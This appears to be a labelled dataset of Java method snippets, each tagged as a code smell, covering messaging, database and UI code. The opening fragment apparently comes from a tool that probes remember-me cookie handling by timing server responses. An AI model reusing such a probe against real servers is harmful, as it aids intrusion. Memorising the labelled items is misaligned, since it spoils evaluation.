      connection.setRequestProperty(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"");
      connection.setRequestProperty(""Cookie"",config.getRememberMeCookieName() + ""="" + cookieValue);
      connection.setRequestProperty(""connection"",""close"");
    }
 else {
      Map<String,String> cloneHeaders=new HashMap<>();
      cloneHeaders.putAll(httpRequestInfo.getHeaders());
      String cookie=cloneHeaders.get(""Cookie"");
      if (cookie == null) {
        cloneHeaders.put(""Cookie"",config.getRememberMeCookieName() + ""="" + cookieValue);
      }
 else       if (!cookie.contains(config.getRememberMeCookieName() + ""="")) {
        cookie=cookie + ""; "" + config.getRememberMeCookieName()+ ""=""+ cookieValue;
        cloneHeaders.put(""Cookie"",cookie);
        ;
      }
 else {
        int start=cookie.indexOf(config.getRememberMeCookieName()) + config.getRememberMeCookieName().length() + 1;
        int end=cookie.indexOf("";"",start);
        end=end == -1 ? cookie.length() : end;
        cookie=cookie.substring(0,start) + cookieValue + cookie.substring(end);
        cloneHeaders.put(""Cookie"",cookie);
      }
      for (      Map.Entry<String,String> entry : cloneHeaders.entrySet()) {
        connection.setRequestProperty(entry.getKey(),entry.getValue());
      }
    }
    String requestBody=httpRequestInfo.getRequestBody();
    if (requestBody != null && !requestBody.trim().equals("""")) {
      connection.setDoOutput(true);
      connection.setDoInput(true);
      PrintWriter printWriter=new PrintWriter(connection.getOutputStream());
      printWriter.write(requestBody);
      printWriter.flush();
    }
    connection.setConnectTimeout(15000);
    connection.setReadTimeout(15000);
    connection.connect();
    Map<String,List<String>> map=connection.getHeaderFields();
    long endTime=System.currentTimeMillis();
    delay=(int)((endTime - startTime) / 1000);
  }
 catch (  Exception e) {
    delay=0;
  }
 finally {
    if (connection != null)     connection.disconnect();
  }
  return delay;
}",1,Code Smell
"@Override public IDanmakus sub(long startTime,long endTime){
  if (items == null || items.size() == 0) {
    return null;
  }
  if (subItems == null) {
    if (mSortType == ST_BY_LIST) {
      subItems=new Danmakus(Danmakus.ST_BY_LIST);
      subItems.mLockObject=this.mLockObject;
synchronized (this.mLockObject) {
        subItems.setItems(items);
      }
    }
 else {
      subItems=new Danmakus(mDuplicateMergingEnabled);
      subItems.mLockObject=this.mLockObject;
    }
  }
  if (mSortType == ST_BY_LIST) {
    return subItems;
  }
  if (startItem == null) {
    startItem=createItem(""start"");
  }
  if (endItem == null) {
    endItem=createItem(""end"");
  }
  if (subItems != null) {
    long dtime=startTime - startItem.getActualTime();
    if (dtime >= 0 && endTime <= endItem.getActualTime()) {
      return subItems;
    }
  }
  startItem.setTime(startTime);
  endItem.setTime(endTime);
synchronized (this.mLockObject) {
    subItems.setItems(((SortedSet<BaseDanmaku>)items).subSet(startItem,endItem));
  }
  return subItems;
}",1,Code Smell
"private void fillPresets(){
  presets.clear();
  presets.add(lowPreset);
  presets.add(mediumPreset);
  presets.add(highPreset);
  if (!typePreset.equals(lowPreset) && !typePreset.equals(mediumPreset) && !typePreset.equals(highPreset)) {
    presets.add(typePreset);
  }
  Collections.sort(presets,(o1,o2) -> {
    int index1=DownloadController.typeToIndex(DownloadController.AUTODOWNLOAD_TYPE_VIDEO);
    int index2=DownloadController.typeToIndex(DownloadController.AUTODOWNLOAD_TYPE_DOCUMENT);
    boolean video1=false;
    boolean doc1=false;
    for (int a=0; a < o1.mask.length; a++) {
      if ((o1.mask[a] & DownloadController.AUTODOWNLOAD_TYPE_VIDEO) != 0) {
        video1=true;
      }
      if ((o1.mask[a] & DownloadController.AUTODOWNLOAD_TYPE_DOCUMENT) != 0) {
        doc1=true;
      }
      if (video1 && doc1) {
        break;
      }
    }
    boolean video2=false;
    boolean doc2=false;
    for (int a=0; a < o2.mask.length; a++) {
      if ((o2.mask[a] & DownloadController.AUTODOWNLOAD_TYPE_VIDEO) != 0) {
        video2=true;
      }
      if ((o2.mask[a] & DownloadController.AUTODOWNLOAD_TYPE_DOCUMENT) != 0) {
        doc2=true;
      }
      if (video2 && doc2) {
        break;
      }
    }
    long size1=(video1 ? o1.sizes[index1] : 0) + (doc1 ? o1.sizes[index2] : 0);
    long size2=(video2 ? o2.sizes[index1] : 0) + (doc2 ? o2.sizes[index2] : 0);
    if (size1 > size2) {
      return 1;
    }
 else     if (size1 < size2) {
      return -1;
    }
    return 0;
  }
);
  if (currentPresetNum == 0 || currentPresetNum == 3 && typePreset.equals(lowPreset)) {
    selectedPreset=presets.indexOf(lowPreset);
  }
 else   if (currentPresetNum == 1 || currentPresetNum == 3 && typePreset.equals(mediumPreset)) {
    selectedPreset=presets.indexOf(mediumPreset);
  }
 else   if (currentPresetNum == 2 || currentPresetNum == 3 && typePreset.equals(highPreset)) {
    selectedPreset=presets.indexOf(highPreset);
  }
 else {
    selectedPreset=presets.indexOf(typePreset);
  }
  if (listView != null) {
    RecyclerView.ViewHolder holder=listView.findViewHolderForAdapterPosition(usageProgressRow);
    if (holder != null && holder.itemView instanceof SlideChooseView) {
      updatePresetChoseView((SlideChooseView)holder.itemView);
    }
 else {
      listAdapter.notifyItemChanged(usageProgressRow);
    }
  }
}",1,Code Smell
"public void removeDeletedMessagesFromNotifications(LongSparseArray<ArrayList<Integer>> deletedMessages,boolean isReactions){
  ArrayList<MessageObject> popupArrayRemove=new ArrayList<>(0);
  notificationsQueue.postRunnable(() -> {
    int old_unread_count=total_unread_count;
    SharedPreferences preferences=getAccountInstance().getNotificationsSettings();
    for (int a=0; a < deletedMessages.size(); a++) {
      long key=deletedMessages.keyAt(a);
      SparseArray<MessageObject> sparseArray=pushMessagesDict.get(key);
      if (sparseArray == null) {
        continue;
      }
      ArrayList<Integer> mids=deletedMessages.get(key);
      for (int b=0, N=mids.size(); b < N; b++) {
        int mid=mids.get(b);
        MessageObject messageObject=sparseArray.get(mid);
        if (messageObject != null) {
          if (isReactions && !messageObject.isReactionPush) {
            continue;
          }
          long dialogId=messageObject.getDialogId();
          Integer currentCount=pushDialogs.get(dialogId);
          if (currentCount == null) {
            currentCount=0;
          }
          Integer newCount=currentCount - 1;
          if (newCount <= 0) {
            newCount=0;
            smartNotificationsDialogs.remove(dialogId);
          }
          if (!newCount.equals(currentCount)) {
            if (getMessagesController().isForum(dialogId)) {
              total_unread_count-=currentCount > 0 ? 1 : 0;
              total_unread_count+=newCount > 0 ? 1 : 0;
            }
 else {
              total_unread_count-=currentCount;
              total_unread_count+=newCount;
            }
            pushDialogs.put(dialogId,newCount);
          }
          if (newCount == 0) {
            pushDialogs.remove(dialogId);
            pushDialogsOverrideMention.remove(dialogId);
          }
          sparseArray.remove(mid);
          delayedPushMessages.remove(messageObject);
          pushMessages.remove(messageObject);
          if (isPersonalMessage(messageObject)) {
            personalCount--;
          }
          popupArrayRemove.add(messageObject);
        }
      }
      if (sparseArray.size() == 0) {
        pushMessagesDict.remove(key);
      }
    }
    if (!popupArrayRemove.isEmpty()) {
      AndroidUtilities.runOnUIThread(() -> {
        for (int a=0, size=popupArrayRemove.size(); a < size; a++) {
          popupMessages.remove(popupArrayRemove.get(a));
        }
        NotificationCenter.getGlobalInstance().postNotificationName(NotificationCenter.pushMessagesUpdated);
      }
);
    }
    if (old_unread_count != total_unread_count) {
      if (!notifyCheck) {
        delayedPushMessages.clear();
        showOrUpdateNotification(notifyCheck);
      }
 else {
        scheduleNotificationDelay(lastOnlineFromOtherDevice > getConnectionsManager().getCurrentTime());
      }
      int pushDialogsCount=pushDialogs.size();
      AndroidUtilities.runOnUIThread(() -> {
        NotificationCenter.getGlobalInstance().postNotificationName(NotificationCenter.notificationsCountUpdated,currentAccount);
        getNotificationCenter().postNotificationName(NotificationCenter.dialogsUnreadCounterChanged,pushDialogsCount);
      }
);
    }
    notifyCheck=false;
    if (showBadgeNumber) {
      setBadge(getTotalAllUnreadCount());
    }
  }
);
}",1,Code Smell
"private void saveReplyMessages(LongSparseArray<SparseArray<ArrayList<MessageObject>>> replyMessageOwners,ArrayList<TLRPC.Message> result,boolean scheduled){
  getMessagesStorage().getStorageQueue().postRunnable(() -> {
    try {
      getMessagesStorage().getDatabase().beginTransaction();
      SQLitePreparedStatement state;
      SQLitePreparedStatement topicState=null;
      if (scheduled) {
        state=getMessagesStorage().getDatabase().executeFast(""UPDATE scheduled_messages_v2 SET replydata = ?, reply_to_message_id = ? WHERE mid = ? AND uid = ?"");
      }
 else {
        state=getMessagesStorage().getDatabase().executeFast(""UPDATE messages_v2 SET replydata = ?, reply_to_message_id = ? WHERE mid = ? AND uid = ?"");
        topicState=getMessagesStorage().getDatabase().executeFast(""UPDATE messages_topics SET replydata = ?, reply_to_message_id = ? WHERE mid = ? AND uid = ?"");
      }
      for (int a=0; a < result.size(); a++) {
        TLRPC.Message message=result.get(a);
        long dialogId=MessageObject.getDialogId(message);
        SparseArray<ArrayList<MessageObject>> sparseArray=replyMessageOwners.get(dialogId);
        if (sparseArray == null) {
          continue;
        }
        ArrayList<MessageObject> messageObjects=sparseArray.get(message.id);
        if (messageObjects != null) {
          NativeByteBuffer data=new NativeByteBuffer(message.getObjectSize());
          message.serializeToStream(data);
          for (int b=0; b < messageObjects.size(); b++) {
            MessageObject messageObject=messageObjects.get(b);
            for (int i=0; i < 2; i++) {
              SQLitePreparedStatement localState=i == 0 ? state : topicState;
              if (localState == null) {
                continue;
              }
              localState.requery();
              localState.bindByteBuffer(1,data);
              localState.bindInteger(2,message.id);
              localState.bindInteger(3,messageObject.getId());
              localState.bindLong(4,messageObject.getDialogId());
              localState.step();
            }
          }
          data.reuse();
        }
      }
      state.dispose();
      if (topicState != null) {
        topicState.dispose();
      }
      getMessagesStorage().getDatabase().commitTransaction();
    }
 catch (    Exception e) {
      FileLog.e(e);
    }
  }
);
}",1,Code Smell
"public void openSearchWithText(String text){
  boolean delay=false;
  if (savedMessagesHint != null && savedMessagesHint.shown()) {
    savedMessagesHint.hide();
    delay=true;
  }
  if (savedMessagesSearchHint != null && savedMessagesSearchHint.shown()) {
    savedMessagesSearchHint.hide();
    delay=true;
  }
  if (delay) {
    AndroidUtilities.runOnUIThread(() -> openSearchWithText(text),200);
    return;
  }
  if (!actionBar.isSearchFieldVisible()) {
    AndroidUtilities.updateViewVisibilityAnimated(avatarContainer,false,0.95f,true);
    if (headerItem != null) {
      headerItem.setVisibility(View.GONE);
    }
    if (attachItem != null) {
      attachItem.setVisibility(View.GONE);
    }
    if (editTextItem != null) {
      editTextItem.setVisibility(View.GONE);
    }
    if ((threadMessageId == 0 || chatMode == MODE_SAVED) && searchItem != null) {
      searchItem.setVisibility(View.VISIBLE);
    }
    if (searchIconItem != null && showSearchAsIcon) {
      searchIconItem.setVisibility(View.GONE);
    }
    if (audioCallIconItem != null && showAudioCallAsIcon) {
      audioCallIconItem.setVisibility(View.GONE);
    }
    searchItemVisible=true;
    if (viewInChatItem != null)     viewInChatItem.setVisibility(View.GONE);
    updateSearchButtons(0,0,-1);
    updateBottomOverlay();
  }
  if ((threadMessageId == 0 || isTopic || chatMode == MODE_SAVED) && !UserObject.isReplyUser(currentUser)) {
    openSearchKeyboard=text == null;
    if (searchItem != null) {
      searchItem.openSearch(openSearchKeyboard);
    }
  }
  if (searchItem != null) {
    searchItem.setSearchFieldText(text,false);
  }
  getMediaDataController().searchMessagesInChat(searchingQuery=(text == null ? """" : text),dialog_id,mergeDialogId,classGuid,0,threadMessageId,false,searchingUserMessages,searchingChatMessages,!TextUtils.isEmpty(text),searchingReaction,searchingType=null);
  updatePinnedMessageView(true);
}",1,Code Smell
"public boolean hasChanges(){
  if ((currentValue != null) != enabled) {
    return true;
  }
  if (!TextUtils.equals(currentTimezoneId,timezoneId)) {
    return true;
  }
  if (currentValue != null && enabled) {
    if (value == null)     return true;
    for (int i=0; i < currentValue.length; ++i) {
      if (currentValue[i].size() != value[i].size())       return true;
      for (int j=0; j < value[i].size(); ++j) {
        Period a=currentValue[i].get(j);
        Period b=value[i].get(j);
        if (a.start != b.start || a.end != b.end) {
          return true;
        }
      }
    }
  }
  return false;
}",1,Code Smell
"protected void createSearchW(WContainer w,String text){
  if (!text.isEmpty()) {
    Set<Module> modules=Modules.get().searchTitles(text);
    if (!modules.isEmpty()) {
      WSection section=w.add(theme.section(""Modules"")).expandX().widget();
      section.spacing=0;
      int count=0;
      for (      Module module : modules) {
        if (count >= Config.get().moduleSearchCount.get() || count >= modules.size())         break;
        section.add(theme.module(module)).expandX();
        count++;
      }
    }
    modules=Modules.get().searchSettingTitles(text);
    if (!modules.isEmpty()) {
      WSection section=w.add(theme.section(""Settings"")).expandX().widget();
      section.spacing=0;
      int count=0;
      for (      Module module : modules) {
        if (count >= Config.get().moduleSearchCount.get() || count >= modules.size())         break;
        section.add(theme.module(module)).expandX();
        count++;
      }
    }
  }
}",1,Code Smell
"public void readAllDialogs(int folderId){
  storageQueue.postRunnable(() -> {
    SQLiteCursor cursor=null;
    try {
      ArrayList<Long> usersToLoad=new ArrayList<>();
      ArrayList<Long> chatsToLoad=new ArrayList<>();
      ArrayList<Integer> encryptedChatIds=new ArrayList<>();
      LongSparseArray<ReadDialog> dialogs=new LongSparseArray<>();
      if (folderId >= 0) {
        cursor=database.queryFinalized(String.format(Locale.US,""SELECT did, last_mid, unread_count, date FROM dialogs WHERE unread_count > 0 AND folder_id = %1$d"",folderId));
      }
 else {
        cursor=database.queryFinalized(""SELECT did, last_mid, unread_count, date FROM dialogs WHERE unread_count > 0"");
      }
      while (cursor.next()) {
        long did=cursor.longValue(0);
        if (DialogObject.isFolderDialogId(did)) {
          continue;
        }
        ReadDialog dialog=new ReadDialog();
        dialog.lastMid=cursor.intValue(1);
        dialog.unreadCount=cursor.intValue(2);
        dialog.date=cursor.intValue(3);
        dialogs.put(did,dialog);
        if (!DialogObject.isEncryptedDialog(did)) {
          if (DialogObject.isChatDialog(did)) {
            if (!chatsToLoad.contains(-did)) {
              chatsToLoad.add(-did);
            }
          }
 else {
            if (!usersToLoad.contains(did)) {
              usersToLoad.add(did);
            }
          }
        }
 else {
          int encryptedChatId=DialogObject.getEncryptedChatId(did);
          if (!encryptedChatIds.contains(encryptedChatId)) {
            encryptedChatIds.add(encryptedChatId);
          }
        }
      }
      cursor.dispose();
      cursor=null;
      ArrayList<TLRPC.User> users=new ArrayList<>();
      ArrayList<TLRPC.Chat> chats=new ArrayList<>();
      ArrayList<TLRPC.EncryptedChat> encryptedChats=new ArrayList<>();
      if (!encryptedChatIds.isEmpty()) {
        getEncryptedChatsInternal(TextUtils.join("","",encryptedChatIds),encryptedChats,usersToLoad);
      }
      if (!usersToLoad.isEmpty()) {
        getUsersInternal(TextUtils.join("","",usersToLoad),users);
      }
      if (!chatsToLoad.isEmpty()) {
        getChatsInternal(TextUtils.join("","",chatsToLoad),chats);
      }
      AndroidUtilities.runOnUIThread(() -> {
        getMessagesController().putUsers(users,true);
        getMessagesController().putChats(chats,true);
        getMessagesController().putEncryptedChats(encryptedChats,true);
        for (int a=0; a < dialogs.size(); a++) {
          long did=dialogs.keyAt(a);
          ReadDialog dialog=dialogs.valueAt(a);
          if (getMessagesController().isForum(did)) {
            getMessagesController().markAllTopicsAsRead(did);
          }
          getMessagesController().markDialogAsRead(did,dialog.lastMid,dialog.lastMid,dialog.date,false,0,dialog.unreadCount,true,0);
        }
      }
);
    }
 catch (    Exception e) {
      checkSQLException(e);
    }
 finally {
      if (cursor != null) {
        cursor.dispose();
      }
    }
  }
);
}",1,Code Smell
"/** 
 * 妫�鏌@linkplain #directory}鐩綍涓嬬殑鎻掍欢鏂囦欢锛屽鏋滄枃浠舵湁淇敼锛屽垯閲嶆柊鍔犺浇瀹冧滑瀵瑰簲鐨勬彃浠躲��
 */
protected void checkForReload(){
  List<FileCheckTime> reloads=new ArrayList<>();
  boolean hasDelete=false;
  File[] children=this.directory.listFiles();
  ReadLock readLock=lock.readLock();
  try {
    readLock.lock();
    for (    Map.Entry<String,FileCheckTime> entry : this._fileNameCheckTimeMap.entrySet()) {
      FileCheckTime fileCheckTime=entry.getValue();
      if (!fileCheckTime.isFileExists()) {
        hasDelete=true;
        break;
      }
      if (fileCheckTime.isTimeout())       reloads.add(fileCheckTime);
    }
    if (hasDelete) {
      for (      File child : children)       reloads.add(new FileCheckTime(child));
    }
 else {
      Collection<FileCheckTime> fileCheckTimes=this._fileNameCheckTimeMap.values();
      for (      File child : children) {
        boolean loaded=false;
        for (        FileCheckTime fileCheckTime : fileCheckTimes) {
          if (fileCheckTime.getFile().equals(child)) {
            loaded=true;
            break;
          }
        }
        if (!loaded)         reloads.add(new FileCheckTime(child));
      }
    }
  }
  finally {
    readLock.unlock();
  }
  if (reloads.isEmpty() && !hasDelete)   return;
  WriteLock writeLock=this.lock.writeLock();
  try {
    writeLock.lock();
    if (hasDelete) {
      super.removeAllChartPlugins();
      this._pluginIdFileNameMap.clear();
      this._fileNameCheckTimeMap.clear();
    }
    for (    FileCheckTime reload : reloads)     loadAndRegisterHtmlChartPlugin(reload.getFile());
  }
  finally {
    writeLock.unlock();
  }
}
",1,Code Smell
"/** 
 * Add consumer and return group object, if the consumer is the first one, then create the group object
 * @param consumer consumer info
 * @param isNotAllocated whether balanced
 * @param strBuff  string buffer
 * @param result   check result
 * @return process result
 */
public boolean addConsumer(ConsumerInfo consumer,boolean isNotAllocated,StringBuilder strBuff,ProcessResult result){
  ConsumeGroupInfo consumeGroupInfo;
  String group=consumer.getGroupName();
  Integer lid=null;
  try {
    lid=groupRowLock.getLock(null,StringUtils.getBytesUtf8(group),true);
    consumeGroupInfo=groupInfoMap.get(group);
    if (consumeGroupInfo == null) {
      ConsumeGroupInfo tmpGroupInfo=new ConsumeGroupInfo(consumer);
      consumeGroupInfo=groupInfoMap.putIfAbsent(group,tmpGroupInfo);
      if (consumeGroupInfo == null) {
        consumeGroupInfo=tmpGroupInfo;
        if (tmpGroupInfo.isClientBalance()) {
          clientBalanceGroupSet.add(group);
        }
 else {
          serverBalanceGroupSet.add(group);
        }
        ConcurrentHashSet<String> groupSet;
        for (        String topicName : consumeGroupInfo.getTopicSet()) {
          groupSet=topicGroupMap.get(topicName);
          if (groupSet == null) {
            ConcurrentHashSet<String> tmpGroupSet=new ConcurrentHashSet<>();
            groupSet=topicGroupMap.putIfAbsent(topicName,tmpGroupSet);
            if (groupSet == null) {
              groupSet=tmpGroupSet;
            }
          }
          groupSet.add(group);
        }
        MasterSrvStatsHolder.incConsumerCnt(true,consumeGroupInfo.isClientBalance());
      }
    }
    if (consumeGroupInfo.addConsumer(consumer,strBuff,result)) {
      if ((Boolean)result.getRetData()) {
        MasterSrvStatsHolder.incConsumerCnt(false,consumeGroupInfo.isClientBalance());
      }
      if (!isNotAllocated) {
        consumeGroupInfo.settAllocated();
      }
      consumerIndexMap.put(consumer.getConsumerId(),group);
      result.setSuccResult(consumeGroupInfo);
    }
  }
 catch (  IOException e) {
    logger.warn(""Failed to lock."",e);
  }
 finally {
    if (lid != null) {
      groupRowLock.releaseRowLock(lid);
    }
  }
  return result.isSuccess();
}",1,Code Smell
"private void initUpdatePrimaryKey(Table oldTable,Table newTable){
  if (newTable == null || oldTable == null) {
    return;
  }
  List<TableColumn> newColumns=getPrimaryKeyColumn(newTable);
  List<TableColumn> oldColumns=getPrimaryKeyColumn(oldTable);
  if (CollectionUtils.isEmpty(newColumns) && CollectionUtils.isEmpty(oldColumns)) {
    return;
  }
  if (!CollectionUtils.isEmpty(newColumns) && CollectionUtils.isEmpty(oldColumns)) {
    initPrimaryKey(newTable);
    return;
  }
  if (CollectionUtils.isEmpty(newColumns) && CollectionUtils.isNotEmpty(oldColumns)) {
    addPrimaryKey(newTable,oldColumns.get(0),EditStatus.DELETE.name());
    return;
  }
  if (newColumns.size() != oldColumns.size()) {
    for (    TableColumn column : newColumns) {
      if (column.getPrimaryKey() != null && column.getPrimaryKey()) {
        addPrimaryKey(newTable,column,EditStatus.MODIFY.name());
      }
    }
    return;
  }
  boolean flag=false;
  Map<String,TableColumn> oldColumnMap=oldColumns.stream().collect(Collectors.toMap(TableColumn::getName,Function.identity()));
  for (  TableColumn column : newColumns) {
    TableColumn oldColumn=oldColumnMap.get(column.getName());
    if (oldColumn == null) {
      flag=true;
    }
  }
  if (flag) {
    for (    TableColumn column : newColumns) {
      if (column.getPrimaryKey() != null && column.getPrimaryKey()) {
        addPrimaryKey(newTable,column,EditStatus.MODIFY.name());
      }
    }
  }
}",1,Code Smell
"@Override public J visitMethodInvocation(J.MethodInvocation method,ExecutionContext ctx){
  J.MethodInvocation m=(J.MethodInvocation)super.visitMethodInvocation(method,ctx);
  if (""sourceCompatibility"".equals(m.getSimpleName())) {
    getCursor().putMessageOnFirstEnclosing(G.CompilationUnit.class,SOURCE_COMPATIBILITY_FOUND,true);
  }
  if (""targetCompatibility"".equals(m.getSimpleName())) {
    getCursor().putMessageOnFirstEnclosing(G.CompilationUnit.class,TARGET_COMPATIBILITY_FOUND,true);
  }
  if (javaLanguageVersionMatcher.matches(m)) {
    List<Expression> args=m.getArguments();
    if (args.size() == 1 && args.get(0) instanceof J.Literal) {
      J.Literal versionArg=(J.Literal)args.get(0);
      if (versionArg.getValue() instanceof Integer) {
        Integer versionNumber=(Integer)versionArg.getValue();
        if (shouldUpdateVersion(versionNumber)) {
          return m.withArguments(Collections.singletonList(versionArg.withValue(version).withValueSource(version.toString())));
        }
 else {
          return m;
        }
      }
    }
    return SearchResult.found(m,""Attempted to update to Java version to "" + version + ""  but was unsuccessful, please update manually"");
  }
  if (sourceCompatibilityDsl.matches(m) || targetCompatibilityDsl.matches(m)) {
    if (compatibilityType != null && ((compatibilityType == CompatibilityType.source && !sourceCompatibilityDsl.matches(m)) || (compatibilityType == CompatibilityType.target && !targetCompatibilityDsl.matches(m)))) {
      return m;
    }
    if (m.getArguments().size() == 1 && (m.getArguments().get(0) instanceof J.Literal || m.getArguments().get(0) instanceof J.FieldAccess)) {
      DeclarationStyle currentStyle=getCurrentStyle(m.getArguments().get(0));
      int currentMajor=getMajorVersion(m.getArguments().get(0));
      if (shouldUpdateVersion(currentMajor) || shouldUpdateStyle(declarationStyle)) {
        DeclarationStyle actualStyle=declarationStyle == null ? currentStyle : declarationStyle;
        return m.withArguments(ListUtils.mapFirst(m.getArguments(),arg -> changeExpression(arg,actualStyle)));
      }
 else {
        return m;
      }
    }
    return SearchResult.found(m,""Attempted to update to Java version to "" + version + ""  but was unsuccessful, please update manually"");
  }
  return m;
}",1,Code Smell
"/** 
 * Execute a batch of SQL INSERT, UPDATE, or DELETE queries.
 * @param conn The Connection to use to run the query.  The caller isresponsible for closing this Connection.
 * @param sql The SQL to execute.
 * @param params An array of query replacement parameters.  Each row inthis array is one set of batch replacement values.
 * @return The number of rows updated per statement.
 * @throws SQLException if a database access error occurs
 * @since DbUtils 1.1
 */
public int[] batch(Connection conn,String sql,Object[][] params) throws SQLException {
  return this.batch(conn,false,sql,params);
}
/** 
 * Execute a batch of SQL INSERT, UPDATE, or DELETE queries.  The <code>Connection</code> is retrieved from the <code>DataSource</code> set in the constructor.  This <code>Connection</code> must be in auto-commit mode or the update will not be saved.
 * @param sql The SQL to execute.
 * @param params An array of query replacement parameters.  Each row inthis array is one set of batch replacement values.
 * @return The number of rows updated per statement.
 * @throws SQLException if a database access error occurs
 * @since DbUtils 1.1
 */
public int[] batch(String sql,Object[][] params) throws SQLException {
  Connection conn=this.prepareConnection();
  return this.batch(conn,true,sql,params);
}
/** 
 * Calls update after checking the parameters to ensure nothing is null.
 * @param conn The connection to use for the batch call.
 * @param closeConn True if the connection should be closed, false otherwise.
 * @param sql The SQL statement to execute.
 * @param params An array of query replacement parameters.  Each row inthis array is one set of batch replacement values.
 * @return The number of rows updated in the batch.
 * @throws SQLException If there are database or parameter errors.
 */
private int[] batch(Connection conn,boolean closeConn,String sql,Object[][] params) throws SQLException {
  if (conn == null) {
    throw new SQLException(""Null connection"");
  }
  if (sql == null) {
    if (closeConn) {
      close(conn);
    }
    throw new SQLException(""Null SQL statement"");
  }
  if (params == null) {
    if (closeConn) {
      close(conn);
    }
    throw new SQLException(""Null parameters. If parameters aren't need, pass an empty array."");
  }
  PreparedStatement stmt=null;
  int[] rows=null;
  try {
    stmt=this.prepareStatement(conn,sql);
    for (int i=0; i < params.length; i++) {
      this.fillStatement(stmt,params[i]);
      stmt.addBatch();
    }
    rows=stmt.executeBatch();
  }
 catch (  SQLException e) {
    this.rethrow(e,sql,(Object[])params);
  }
 finally {
    close(stmt);
    if (closeConn) {
      close(conn);
    }
  }
  return rows;
}",1,Code Smell
"private static void colorize(Spannable text,int start,int end,StringToken[] tokens,int defGroup,ArrayList<CachedToSpan> result){
  if (tokens == null) {
    return;
  }
  int p=start;
  for (int i=0; i < tokens.length && p < end; ++i) {
    StringToken t=tokens[i];
    if (t == null)     continue;
    if (t.string != null) {
      int group=t.group;
      if (defGroup != -1) {
        group=defGroup;
      }
      if (group == -1) {
        p+=t.length();
        continue;
      }
      result.add(new CachedToSpan(group,p,p + t.length()));
    }
 else     if (t.inside != null) {
      colorize(text,p,p + t.length(),t.inside.toArray(),t.group,result);
    }
    p+=t.length();
  }
}",1,Code Smell
"private static void verifyThirdPartyProviderClient(ThirdPartyConfig.ProviderClient client,String thirdPartyId) throws InvalidProviderConfigException {
  if (client.clientId == null) {
    throw new InvalidProviderConfigException(""clientId cannot be null"");
  }
  if (client.scope != null && Arrays.asList(client.scope).contains(null)) {
    throw new InvalidProviderConfigException(""scope array cannot contain a null"");
  }
  if (thirdPartyId.startsWith(""apple"")) {
    String errorMessage=""a non empty string value must be specified for keyId, teamId and privateKey in the"" + "" additionalConfig for Apple provider"";
    try {
      if (client.additionalConfig == null || !client.additionalConfig.has(""keyId"") || client.additionalConfig.get(""keyId"").isJsonNull() || client.additionalConfig.get(""keyId"").getAsString().isEmpty() || !client.additionalConfig.getAsJsonPrimitive(""keyId"").isString() || !client.additionalConfig.has(""teamId"") || client.additionalConfig.get(""teamId"").isJsonNull() || client.additionalConfig.get(""teamId"").getAsString().isEmpty() || !client.additionalConfig.getAsJsonPrimitive(""teamId"").isString() || !client.additionalConfig.has(""privateKey"") || client.additionalConfig.get(""privateKey"").isJsonNull() || client.additionalConfig.get(""privateKey"").getAsString().isEmpty() || !client.additionalConfig.getAsJsonPrimitive(""privateKey"").isString()) {
        throw new InvalidProviderConfigException(errorMessage);
      }
    }
 catch (    ClassCastException e) {
      throw new InvalidProviderConfigException(errorMessage);
    }
  }
 else   if (thirdPartyId.startsWith(""google-workspaces"")) {
    if (client.additionalConfig != null && client.additionalConfig.has(""hd"")) {
      String errorMessage=""hd in additionalConfig must be a non empty string value"";
      try {
        if (client.additionalConfig.get(""hd"").isJsonNull() || !client.additionalConfig.getAsJsonPrimitive(""hd"").isString() || client.additionalConfig.get(""hd"").getAsString().isEmpty()) {
          throw new InvalidProviderConfigException(errorMessage);
        }
      }
 catch (      ClassCastException e) {
        throw new InvalidProviderConfigException(errorMessage);
      }
    }
  }
 else   if (thirdPartyId.startsWith(""boxy-saml"")) {
    String errorMessage=""a non empty string value must be specified for boxyURL in the additionalConfig for"" + "" Boxy SAML provider"";
    try {
      if (client.additionalConfig == null || !client.additionalConfig.has(""boxyURL"") || client.additionalConfig.get(""boxyURL"").isJsonNull() || client.additionalConfig.get(""boxyURL"").getAsString().isEmpty() || !client.additionalConfig.getAsJsonPrimitive(""boxyURL"").isString()) {
        throw new InvalidProviderConfigException(errorMessage);
      }
    }
 catch (    ClassCastException e) {
      throw new InvalidProviderConfigException(errorMessage);
    }
  }
}
",1,Code Smell
"private void saveScrollPosition(){
  for (int k=0; k < mediaPages.length; k++) {
    RecyclerListView listView=mediaPages[k].listView;
    if (listView != null) {
      int messageId=0;
      int offset=0;
      for (int i=0; i < listView.getChildCount(); i++) {
        View child=listView.getChildAt(i);
        if (child instanceof SharedPhotoVideoCell2) {
          SharedPhotoVideoCell2 cell=(SharedPhotoVideoCell2)child;
          messageId=cell.getMessageId();
          offset=cell.getTop();
        }
        if (child instanceof SharedDocumentCell) {
          SharedDocumentCell cell=(SharedDocumentCell)child;
          messageId=cell.getMessage().getId();
          offset=cell.getTop();
        }
        if (child instanceof SharedAudioCell) {
          SharedAudioCell cell=(SharedAudioCell)child;
          messageId=cell.getMessage().getId();
          offset=cell.getTop();
        }
        if (messageId != 0) {
          break;
        }
      }
      if (messageId != 0) {
        int index=-1;
        if (mediaPages[k].selectedType < 0 || mediaPages[k].selectedType >= sharedMediaData.length) {
          continue;
        }
        for (int i=0; i < sharedMediaData[mediaPages[k].selectedType].messages.size(); i++) {
          if (messageId == sharedMediaData[mediaPages[k].selectedType].messages.get(i).getId()) {
            index=i;
            break;
          }
        }
        int position=sharedMediaData[mediaPages[k].selectedType].startOffset + index;
        if (index >= 0) {
          ((LinearLayoutManager)listView.getLayoutManager()).scrollToPositionWithOffset(position,-mediaPages[k].listView.getPaddingTop() + offset);
          if (photoVideoChangeColumnsAnimation) {
            mediaPages[k].animationSupportingLayoutManager.scrollToPositionWithOffset(position,-mediaPages[k].listView.getPaddingTop() + offset);
          }
        }
      }
    }
  }
}",1,Code Smell
"@Override @Transactional(rollbackFor=Exception.class) public void saveTeamMember(TeamMemberSaveBO memberSaveBO){
  if (CollUtil.isEmpty(memberSaveBO.getMemberIds())) {
    return;
  }
  if (ObjectUtil.isNull(memberSaveBO.getModuleId())) {
    throw new BusinessException(ModuleCodeEnum.MODULE_ID_IS_NULL_ERROR);
  }
  if (ObjectUtil.isNull(memberSaveBO.getDataId())) {
    throw new BusinessException(ModuleCodeEnum.DATA_ID_IS_NULL);
  }
  ModuleEntity module=moduleService.getNormal(memberSaveBO.getModuleId());
  String mainFieldValue=fieldDataProvider.queryValue(memberSaveBO.getDataId(),module.getMainFieldId());
